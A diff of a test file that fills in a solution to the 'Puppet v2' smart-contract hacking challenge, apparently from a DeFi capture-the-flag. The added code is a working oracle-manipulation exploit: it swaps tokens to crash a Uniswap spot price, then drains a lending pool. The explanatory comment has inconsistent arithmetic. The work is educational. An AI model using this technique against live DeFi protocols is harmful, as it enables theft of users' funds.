@@ -80,8 +80,71 @@ describe('[Challenge] Puppet v2', function () {
         ).to.be.eq(ethers.utils.parseEther('300000'));
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // 1. Swap all but 1 DVT to ETH using the Uniswap pool to push the ETH/DVT price down
+    //      - Attacker now has 29.9 ETH and 1 DVT post swap
+    //      - Uniswap pool now has 0.1 ETH and 10099 DVT
+    // 2. Attacker calls 'borrow()' while the oracle price for ETH/DVT is low and drains lending pool
+    //      - depositAmount = borrowAmount * ETH/DVT price * 2
+    //      - depositAmount = (1,000,000 DVT) * (0.1 ETH / 10099 DVT) * 3
+    //      - depositAmount = ~29.5 ETH 
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Amount of WETH needed to borrow all DVT from the lending pool
+        const depositAmountBefore = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log(`
+            Initial Uniswap pool balances: ${ethers.utils.formatEther(UNISWAP_INITIAL_WETH_RESERVE)} WETH | ${ethers.utils.formatEther(UNISWAP_INITIAL_TOKEN_RESERVE)} DVT
+            Initial attacker balances: 20 ETH | 10,000 DVT
+            
+            WETH needed to drain lending pool (pre swap): ${ethers.utils.formatEther(depositAmountBefore)}
+        `);
+
+        // Approve Uniswap router
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.constants.MaxUint256);
+        const swapAmount = ATTACKER_INITIAL_TOKEN_BALANCE.sub(ethers.constants.WeiPerEther);
+
+        // Swap all but 1 DVT for WETH using the Uniswap router
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            swapAmount,
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            999999999999999
+        );
+
+        // Get ETH balance of the attacker post swap
+        const ethAmountAfter = await ethers.provider.getBalance(attacker.address);
+    
+        const amountOut = ethAmountAfter.sub(ethers.utils.parseEther("20"));
+        const uniswapTokenBalance = ethers.utils.formatEther(UNISWAP_INITIAL_TOKEN_RESERVE.add(swapAmount));
+        const uniswapEthBalance = ethers.utils.formatEther(UNISWAP_INITIAL_WETH_RESERVE.sub(amountOut));
+
+        console.log(`
+            Swapping ${ethers.utils.formatEther(swapAmount)} DVT for ${ethers.utils.formatEther(amountOut)} ETH
+            
+            Uniswap pool balances: ${uniswapEthBalance} WETH | ${uniswapTokenBalance} DVT
+            Attacker balances: ${ethers.utils.formatEther(ethAmountAfter)} ETH | 1 DVT
+        `);
+
+        // Calculate new amount of WETH needed to borrow all DVT from lending pool
+        // Ensure that the lending pool deposit amount has decreased
+        const depositAmountAfter = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        expect(depositAmountAfter).to.be.lt(depositAmountBefore);
+        
+        // Ensure that the attacker has enough ETH to drain the lending pool
+        expect(ethAmountAfter).to.be.gt(depositAmountAfter);
+        
+        console.log(` 
+            WETH needed to drain lending pool (post swap): ${ethers.utils.formatEther(depositAmountAfter)}
+        `);
+
+        // Convert ETH to WETH and approve the lending pool
+        await this.weth.connect(attacker).deposit({value: depositAmountAfter});
+        await this.weth.connect(attacker).approve(this.lendingPool.address, ethers.constants.MaxUint256);
+
+        // Drain lending pool of all DVT
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
